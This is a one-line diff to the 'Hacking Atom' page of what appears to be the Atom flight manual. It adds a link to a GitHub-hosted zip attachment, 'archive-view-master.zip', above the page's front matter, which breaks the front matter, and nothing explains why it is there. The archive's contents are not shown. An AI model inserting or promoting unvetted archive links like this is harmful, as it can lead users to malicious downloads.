@@ -1,3 +1,4 @@
+[archive-view-master.zip](https://github.com/atom/flight-manual.atom.io/files/8936467/archive-view-master.zip)
 ---
 title: Hacking Atom
 ---
